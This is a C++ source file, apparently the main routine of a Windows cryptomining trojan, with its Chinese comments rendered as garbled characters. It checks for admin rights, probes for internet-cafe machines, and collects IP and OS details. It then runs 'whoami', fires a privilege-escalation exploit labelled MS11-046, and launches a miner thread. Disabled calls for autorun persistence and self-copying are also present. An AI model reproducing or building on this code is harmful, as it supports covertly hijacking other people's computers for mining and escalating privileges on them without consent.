// NitroMain.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "module.h"

//////////////////////////////////////////////////////////////
BOOL StartMiner(App& minerApp); //����miner
VOID argvW2A(char **argv, LPWSTR *argvW, int argc); //�����ֽ�ת��

//BOOL StartMiner(int argc, char **argv); //����miner

////////////////////////////////////////////////////////////
DWORD WINAPI myFunc(LPVOID lpParam)
{  
	App* mapp = (App*)lpParam;
	printf("exec\r\n");
	mapp->exec();
	return 0;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,	_In_opt_ HINSTANCE hPrevInstance,
					_In_ LPWSTR    lpCmdLine,	_In_ int nCmdShow)
{	
	//char **argv = (char**)malloc(argc * sizeof(char *) + 1);
	//memset(argv, '0', argc * sizeof(char *) + 1);
	
	//argvW = CommandLineToArgvW(GetCommandLine(), &argc);
	
	//argvW2A(argv, argvW, argc);


	CSysInfo info;
	if (info.IsRunAsAdmin())
	{
		printf("[+] Admin\n");
	}
	else
	{
		printf("[-] NonAdmin\n");
	}
	info.IsNetBar();
	info.GetIPInfo();
	info.GetOSInfo();

	system("whoami");
	
	CToolKit kit;
	kit.execExp(CToolKit::EXP_MS_11046);
	kit.IsKeyEdit();
	
	//kit.setAutoRun();
	//kit.copySelf();
	


	App minerApp; //α����
	StartMiner(minerApp);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}


//����miner�߳�
BOOL StartMiner(App& minerApp)
{


	DWORD threadID;

	HANDLE hThread = CreateThread(NULL, // default security attributes
		0, // use default stack size
		myFunc, // thread function
		&minerApp, // argument to thread function
		0, // use default creation flags	
		&threadID); // returns the thread identifier

	if (hThread == NULL)
	{
		MessageBox(NULL, L"Create Thread Failed!", L"warning", MB_OK);
		ExitProcess(-1);
	}
	
	//��ֹminer�������������ͷ�
	Sleep(500);
	
	return TRUE;
}

VOID argvW2A(char **argv, LPWSTR *argvW, int argc)
{
	//memset(argv, 0, argc * sizeof(char *) + 1);
	USES_CONVERSION;
	for (int i = 1; i < argc; i++)
	{
		//	MessageBox(NULL, argvW[i], L"Arglist contents", MB_OK);
	//	argv[i] = "hello";
		argv[i] = W2A(argvW[i]);
		//strcpy(argv[i], W2A(argvW[i]));
		MessageBoxA(GetDesktopWindow(), argv[i], "Arglist contents", MB_OK);
	}
}